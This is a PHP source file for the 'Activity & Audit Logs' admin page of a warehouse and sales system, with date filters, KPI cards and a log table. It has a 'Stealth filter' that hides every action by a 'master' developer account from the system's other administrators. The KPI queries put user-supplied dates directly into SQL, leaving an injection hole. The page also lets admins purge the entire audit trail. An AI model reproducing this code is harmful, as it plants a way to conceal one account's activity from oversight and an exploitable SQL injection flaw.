<?php
// activity_logs.php - Dedicated System Activity & Security Audit Trail
// Full audit logs for administrative monitoring (Zero Stock / Security & User Events)
$pageTitle = "Activity & Audit Logs";
require_once __DIR__ . '/config/auth.php';
requireRole(['super_admin', 'admin', 'master']);

$user = currentUser();
$branchId = $user['branch_id'];
$today = date('Y-m-d');
$mondayThisWeek = date('Y-m-d', strtotime('monday this week'));
$firstOfMonth = date('Y-m-01');

// Handle POST actions (Clearing logs)
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    requireCsrf();
    $action = $_POST['action'] ?? '';

    if ($action === 'clear_logs' && hasRole(['super_admin', 'admin', 'master'])) {
        try {
            $pdo->exec("DELETE FROM activity_logs");
            logActivity('clear_logs', 'system', "Administrator '{$user['username']}' purged all activity audit logs", $user['id']);
            setFlash('success', 'All system activity and audit logs cleared successfully.');
        } catch (Exception $e) {
            setFlash('danger', 'Error clearing activity logs: ' . $e->getMessage());
        }
        header("Location: activity_logs.php");
        exit;
    }
}

// Date Presets & Filter handling
$preset = $_GET['preset'] ?? '';
if ($preset === 'daily' || $preset === 'today') {
    $fromDate = $today;
    $toDate = $today;
} elseif ($preset === 'weekly') {
    $fromDate = $mondayThisWeek;
    $toDate = $today;
} elseif ($preset === 'monthly') {
    $fromDate = $firstOfMonth;
    $toDate = $today;
} else {
    $fromDate = $_GET['from_date'] ?? $firstOfMonth;
    $toDate = $_GET['to_date'] ?? $today;
}

// Determine active preset for UI highlighting
if ($fromDate === $today && $toDate === $today) {
    $activePreset = 'daily';
} elseif ($fromDate === $mondayThisWeek && $toDate === $today) {
    $activePreset = 'weekly';
} elseif ($fromDate === $firstOfMonth && $toDate === $today) {
    $activePreset = 'monthly';
} else {
    $activePreset = 'custom';
}

$isMasterUser = isMaster();
$logActionFilter = $_GET['log_action'] ?? '';
$logUserFilter = trim($_GET['log_user'] ?? '');

// Base SQL query
$logSql = "SELECT * FROM activity_logs WHERE DATE(created_at) BETWEEN ? AND ?";
$logParams = [$fromDate, $toDate];

// Stealth filter: If viewer is NOT master, completely hide master developer actions
if (!$isMasterUser) {
    $logSql .= " AND user_role != 'master' AND (user_name NOT LIKE '%Master%' OR user_name IS NULL) AND action NOT LIKE '%master%' AND description NOT LIKE '%Master%'";
}

if (!empty($logActionFilter)) {
    $logSql .= " AND action = ?";
    $logParams[] = $logActionFilter;
}
if (!empty($logUserFilter)) {
    $logSql .= " AND (user_name LIKE ? OR description LIKE ?)";
    $logParams[] = "%$logUserFilter%";
    $logParams[] = "%$logUserFilter%";
}
$logSql .= " ORDER BY id DESC LIMIT 250";

$stmtLogs = $pdo->prepare($logSql);
$stmtLogs->execute($logParams);
$activityLogsList = $stmtLogs->fetchAll();

// Distinct log actions for dropdown filter
$distinctActionsSql = "SELECT DISTINCT action FROM activity_logs WHERE 1=1";
if (!$isMasterUser) {
    $distinctActionsSql .= " AND user_role != 'master' AND action NOT LIKE '%master%'";
}
$distinctActionsSql .= " ORDER BY action ASC";
$distinctLogActions = $pdo->query($distinctActionsSql)->fetchAll(PDO::FETCH_COLUMN);

// Audit KPI Metrics calculation
$kpiWhere = "WHERE DATE(created_at) BETWEEN '$fromDate' AND '$toDate'";
if (!$isMasterUser) {
    $kpiWhere .= " AND user_role != 'master' AND (user_name NOT LIKE '%Master%' OR user_name IS NULL) AND action NOT LIKE '%master%'";
}

$totalLogsCount = $pdo->query("SELECT COUNT(*) FROM activity_logs $kpiWhere")->fetchColumn();
$authEventsCount = $pdo->query("SELECT COUNT(*) FROM activity_logs $kpiWhere AND module = 'auth'")->fetchColumn();
$warehouseEventsCount = $pdo->query("SELECT COUNT(*) FROM activity_logs $kpiWhere AND module IN ('stock', 'lorry', 'pos', 'loan')")->fetchColumn();
$activeStaffCount = $pdo->query("SELECT COUNT(DISTINCT user_id) FROM activity_logs $kpiWhere AND user_id IS NOT NULL")->fetchColumn();

require_once __DIR__ . '/includes/header.php';
?>

<!-- Header -->
<div class="flex flex-col sm:flex-row sm:items-center justify-between pb-6 gap-3 no-print">
    <div>
        <h1 class="text-2xl font-black text-slate-800 tracking-tight flex items-center">
            <span class="w-10 h-10 rounded-2xl bg-indigo-50 text-indigo-600 flex items-center justify-center mr-3 shadow-xs">
                <i class="fa-solid fa-shield-halved text-lg"></i>
            </span>
            System Activity &amp; Audit Trail
        </h1>
        <p class="text-xs text-slate-500 mt-1">
            Real-time security logs &bull; Track warehouse operations, lorry dispatches, counter sales, and user sign-ins
        </p>
    </div>

    <!-- Quick Action / Clear All Button -->
    <div class="flex items-center space-x-2">
        <?php if (hasRole(['super_admin', 'master']) && !empty($activityLogsList)): ?>
        <form method="POST" action="activity_logs.php" onsubmit="return confirmAction(event, this, { title: 'Clear All Activity Logs?', text: 'Are you sure you want to permanently delete all activity and audit trail logs? This action cannot be undone.', confirmText: '<i class=\'fa-solid fa-trash-can mr-1.5\'></i> Yes, Clear All Logs', danger: true });">
            <?= csrfField() ?>
            <input type="hidden" name="action" value="clear_logs">
            <button type="submit" class="px-3.5 py-2 bg-rose-50 hover:bg-rose-100 text-rose-600 border border-rose-200/80 font-bold rounded-xl text-xs transition flex items-center space-x-1.5 cursor-pointer shadow-2xs">
                <i class="fa-solid fa-trash-can text-xs"></i>
                <span>Clear All Logs</span>
            </button>
        </form>
        <?php endif; ?>

        <button type="button" onclick="window.print()" class="px-3.5 py-2 bg-slate-100 hover:bg-slate-200 text-slate-700 font-bold rounded-xl text-xs transition flex items-center space-x-1.5 cursor-pointer shadow-2xs">
            <i class="fa-solid fa-print text-xs"></i>
            <span>Print Trail</span>
        </button>
    </div>
</div>

<!-- ==================== AUDIT METRICS SUMMARY CARDS ==================== -->
<div class="grid grid-cols-2 lg:grid-cols-4 gap-3 sm:gap-4 mb-6">
    <!-- Card 1: Total Events -->
    <div class="bg-white p-4 rounded-2xl border border-slate-200 shadow-xs flex items-center space-x-3.5">
        <div class="w-11 h-11 rounded-xl bg-indigo-50 text-indigo-600 flex items-center justify-center shrink-0">
            <i class="fa-solid fa-list-check text-xl"></i>
        </div>
        <div>
            <div class="text-[11px] font-bold uppercase tracking-wider text-slate-400">Total Activities</div>
            <div class="text-xl font-black text-slate-800 tracking-tight mt-0.5">
                <?= number_format($totalLogsCount) ?> <span class="text-xs font-normal text-slate-500">events</span>
            </div>
        </div>
    </div>

    <!-- Card 2: Security & Auth Events -->
    <div class="bg-white p-4 rounded-2xl border border-slate-200 shadow-xs flex items-center space-x-3.5">
        <div class="w-11 h-11 rounded-xl bg-sky-50 text-sky-600 flex items-center justify-center shrink-0">
            <i class="fa-solid fa-user-shield text-xl"></i>
        </div>
        <div>
            <div class="text-[11px] font-bold uppercase tracking-wider text-slate-400">Security &amp; Auth</div>
            <div class="text-xl font-black text-slate-800 tracking-tight mt-0.5">
                <?= number_format($authEventsCount) ?> <span class="text-xs font-normal text-slate-500">sign-ins/unlocks</span>
            </div>
        </div>
    </div>

    <!-- Card 3: Warehouse Operations -->
    <div class="bg-white p-4 rounded-2xl border border-slate-200 shadow-xs flex items-center space-x-3.5">
        <div class="w-11 h-11 rounded-xl bg-emerald-50 text-emerald-600 flex items-center justify-center shrink-0">
            <i class="fa-solid fa-boxes-stacked text-xl"></i>
        </div>
        <div>
            <div class="text-[11px] font-bold uppercase tracking-wider text-slate-400">Warehouse Ops</div>
            <div class="text-xl font-black text-slate-800 tracking-tight mt-0.5">
                <?= number_format($warehouseEventsCount) ?> <span class="text-xs font-normal text-slate-500">transactions</span>
            </div>
        </div>
    </div>

    <!-- Card 4: Active Staff Involved -->
    <div class="bg-white p-4 rounded-2xl border border-slate-200 shadow-xs flex items-center space-x-3.5">
        <div class="w-11 h-11 rounded-xl bg-purple-50 text-purple-600 flex items-center justify-center shrink-0">
            <i class="fa-solid fa-users text-xl"></i>
        </div>
        <div>
            <div class="text-[11px] font-bold uppercase tracking-wider text-slate-400">Staff Involved</div>
            <div class="text-xl font-black text-slate-800 tracking-tight mt-0.5">
                <?= number_format($activeStaffCount) ?> <span class="text-xs font-normal text-slate-500">personnel</span>
            </div>
        </div>
    </div>
</div>

<!-- ==================== FILTER BAR ==================== -->
<div class="bg-white rounded-2xl border border-slate-200 shadow-xs p-4 sm:p-5 mb-6 no-print">
    <form method="GET" action="activity_logs.php" class="flex flex-col lg:flex-row lg:items-center justify-between gap-4">
        
        <!-- Preset Time Buttons -->
        <div class="flex items-center space-x-1 bg-slate-100 p-1 rounded-xl shrink-0">
            <a href="activity_logs.php?preset=today" 
               class="px-3 py-1.5 rounded-lg text-xs font-bold transition <?= $activePreset === 'daily' ? 'bg-white text-slate-900 shadow-xs' : 'text-slate-600 hover:text-slate-900' ?>">
                Today
            </a>
            <a href="activity_logs.php?preset=weekly" 
               class="px-3 py-1.5 rounded-lg text-xs font-bold transition <?= $activePreset === 'weekly' ? 'bg-white text-slate-900 shadow-xs' : 'text-slate-600 hover:text-slate-900' ?>">
                This Week
            </a>
            <a href="activity_logs.php?preset=monthly" 
               class="px-3 py-1.5 rounded-lg text-xs font-bold transition <?= $activePreset === 'monthly' ? 'bg-white text-slate-900 shadow-xs' : 'text-slate-600 hover:text-slate-900' ?>">
                This Month
            </a>
        </div>

        <!-- Filter Fields -->
        <div class="flex flex-wrap items-center gap-2 text-xs">
            <!-- Custom Date Range -->
            <div class="flex items-center gap-1.5 bg-slate-50 border border-slate-200 px-2.5 py-1.5 rounded-xl">
                <span class="text-slate-400 font-medium">From:</span>
                <input type="date" name="from_date" value="<?= htmlspecialchars($fromDate) ?>" class="bg-transparent font-bold font-mono text-slate-700 focus:outline-none">
                <span class="text-slate-400 font-medium">To:</span>
                <input type="date" name="to_date" value="<?= htmlspecialchars($toDate) ?>" class="bg-transparent font-bold font-mono text-slate-700 focus:outline-none">
            </div>

            <!-- Action Type Dropdown -->
            <select name="log_action" class="px-2.5 py-1.5 bg-slate-50 border border-slate-200 rounded-xl font-bold text-slate-700 text-xs focus:ring-1 focus:ring-indigo-500">
                <option value="">All Action Types</option>
                <?php foreach ($distinctLogActions as $act): ?>
                    <option value="<?= htmlspecialchars($act) ?>" <?= $logActionFilter === $act ? 'selected' : '' ?>>
                        <?= ucwords(str_replace('_', ' ', $act)) ?>
                    </option>
                <?php endforeach; ?>
            </select>

            <!-- Search by User or Keyword -->
            <div class="flex items-center bg-slate-50 border border-slate-200 rounded-xl px-2.5 py-1.5">
                <i class="fa-solid fa-magnifying-glass text-slate-400 mr-1.5 text-[11px]"></i>
                <input type="text" name="log_user" value="<?= htmlspecialchars($logUserFilter) ?>" placeholder="User or description..." 
                       class="font-medium text-slate-700 focus:outline-none text-xs w-36 sm:w-44 bg-transparent">
            </div>

            <button type="submit" class="px-3.5 py-1.5 bg-indigo-600 hover:bg-indigo-700 text-white font-bold rounded-xl text-xs transition cursor-pointer shadow-xs">
                Filter
            </button>

            <?php if ($logActionFilter || $logUserFilter || $activePreset !== 'monthly'): ?>
                <a href="activity_logs.php" class="px-2.5 py-1.5 text-slate-500 hover:text-slate-800 text-xs font-bold transition">
                    Reset
                </a>
            <?php endif; ?>
        </div>
    </form>
</div>

<!-- ==================== AUDIT TRAIL TABLE ==================== -->
<div class="bg-white rounded-2xl border border-slate-200 shadow-xs overflow-hidden">
    <div class="p-4 border-b border-slate-100 flex items-center justify-between bg-slate-50/50">
        <div class="font-extrabold text-xs text-slate-800 uppercase tracking-wider flex items-center">
            <i class="fa-solid fa-clock-rotate-left text-indigo-600 mr-2"></i>
            Audit Trail Records (<?= count($activityLogsList) ?> entries)
        </div>
        <div class="text-[11px] text-slate-400 font-mono">
            Period: <?= date('d M Y', strtotime($fromDate)) ?> &rarr; <?= date('d M Y', strtotime($toDate)) ?>
        </div>
    </div>

    <!-- Desktop View -->
    <div class="hidden md:block overflow-x-auto">
        <table class="w-full text-xs text-left border-collapse">
            <thead>
                <tr class="bg-slate-50 text-slate-500 font-bold uppercase tracking-wider border-b border-slate-200 text-[10px]">
                    <th class="py-3 px-4 w-36">Date &amp; Time</th>
                    <th class="py-3 px-3 w-40">User Account</th>
                    <th class="py-3 px-3 w-28">Module</th>
                    <th class="py-3 px-3 w-36">Action</th>
                    <th class="py-3 px-4">Audit Details / Description</th>
                    <th class="py-3 px-3 w-28 text-right font-mono text-slate-400">IP Address</th>
                </tr>
            </thead>
            <tbody class="divide-y divide-slate-100 text-slate-700">
                <?php if (empty($activityLogsList)): ?>
                <tr>
                    <td colspan="6" class="py-12 text-center text-slate-400">
                        <i class="fa-solid fa-clock-rotate-left text-3xl mb-2 text-slate-300 block"></i>
                        No activity records found for the selected period or filters.
                    </td>
                </tr>
                <?php else: ?>
                <?php foreach ($activityLogsList as $log): 
                    $act = $log['action'];
                    $badgeClass = 'bg-slate-100 text-slate-700 border-slate-200';
                    if (strpos($act, 'grn') !== false || strpos($act, 'product') !== false) {
                        $badgeClass = 'bg-emerald-50 text-emerald-800 border-emerald-200';
                    } elseif (strpos($act, 'dispatch') !== false || strpos($act, 'reload') !== false) {
                        $badgeClass = 'bg-blue-50 text-blue-800 border-blue-200';
                    } elseif (strpos($act, 'settle') !== false) {
                        $badgeClass = 'bg-indigo-50 text-indigo-800 border-indigo-200';
                    } elseif (strpos($act, 'direct') !== false) {
                        $badgeClass = 'bg-teal-50 text-teal-800 border-teal-200';
                    } elseif (strpos($act, 'pos') !== false) {
                        $badgeClass = 'bg-purple-50 text-purple-800 border-purple-200';
                    } elseif (strpos($act, 'loan') !== false) {
                        $badgeClass = 'bg-amber-50 text-amber-800 border-amber-200';
                    } elseif (strpos($act, 'failed') !== false || strpos($act, 'delete') !== false || strpos($act, 'wipe') !== false) {
                        $badgeClass = 'bg-rose-50 text-rose-800 border-rose-200';
                    } elseif (strpos($act, 'login') !== false || strpos($act, 'unlock') !== false || strpos($act, 'password') !== false) {
                        $badgeClass = 'bg-sky-50 text-sky-800 border-sky-200';
                    }
                ?>
                <tr class="hover:bg-slate-50/80 transition-colors">
                    <td class="py-3 px-4 whitespace-nowrap">
                        <div class="font-bold text-slate-800 font-mono text-[11px]"><?= date('d M Y', strtotime($log['created_at'])) ?></div>
                        <div class="text-[10px] text-slate-400 font-mono"><?= date('h:i:s A', strtotime($log['created_at'])) ?></div>
                    </td>
                    <td class="py-3 px-3">
                        <div class="font-bold text-slate-900 flex items-center">
                            <?= htmlspecialchars($log['user_name'] ?: 'System / Guest') ?>
                        </div>
                        <div class="text-[10px] text-slate-400 capitalize font-medium">
                            <?= htmlspecialchars(str_replace('_', ' ', $log['user_role'] ?: 'user')) ?>
                        </div>
                    </td>
                    <td class="py-3 px-3">
                        <span class="px-2 py-0.5 rounded text-[10px] font-bold bg-slate-100 text-slate-600 border border-slate-200/80 font-mono uppercase">
                            <?= htmlspecialchars($log['module']) ?>
                        </span>
                    </td>
                    <td class="py-3 px-3">
                        <span class="px-2 py-0.5 rounded-full text-[10px] font-extrabold border <?= $badgeClass ?>">
                            <?= ucwords(str_replace('_', ' ', $act)) ?>
                        </span>
                    </td>
                    <td class="py-3 px-4 font-medium text-slate-800 leading-snug">
                        <?= htmlspecialchars($log['description']) ?>
                    </td>
                    <td class="py-3 px-3 text-right font-mono text-[10px] text-slate-400">
                        <?= htmlspecialchars($log['ip_address'] ?: '127.0.0.1') ?>
                    </td>
                </tr>
                <?php endforeach; ?>
                <?php endif; ?>
            </tbody>
        </table>
    </div>

    <!-- Mobile View -->
    <div class="md:hidden divide-y divide-slate-100">
        <?php if (empty($activityLogsList)): ?>
            <div class="py-8 text-center text-slate-400 text-xs">No activity records found.</div>
        <?php else: ?>
            <?php foreach ($activityLogsList as $log): ?>
            <div class="p-3.5 hover:bg-slate-50 transition-colors space-y-1.5">
                <div class="flex items-start justify-between gap-2">
                    <div>
                        <span class="font-bold text-slate-900 text-xs"><?= htmlspecialchars($log['user_name'] ?: 'System') ?></span>
                        <span class="text-[10px] text-slate-400 capitalize">&bull; <?= htmlspecialchars(str_replace('_', ' ', $log['user_role'] ?: 'staff')) ?></span>
                    </div>
                    <span class="text-[10px] text-slate-400 font-mono"><?= date('d M, h:i A', strtotime($log['created_at'])) ?></span>
                </div>
                <div class="text-xs text-slate-800 font-medium">
                    <?= htmlspecialchars($log['description']) ?>
                </div>
                <div class="flex items-center justify-between pt-1 border-t border-slate-100 text-[10px]">
                    <span class="font-mono text-slate-400 uppercase"><?= htmlspecialchars($log['module']) ?></span>
                    <span class="px-2 py-0.5 rounded-full font-bold bg-slate-100 text-slate-700">
                        <?= ucwords(str_replace('_', ' ', $log['action'])) ?>
                    </span>
                </div>
            </div>
            <?php endforeach; ?>
        <?php endif; ?>
    </div>
</div>

<?php require_once __DIR__ . '/includes/footer.php'; ?>
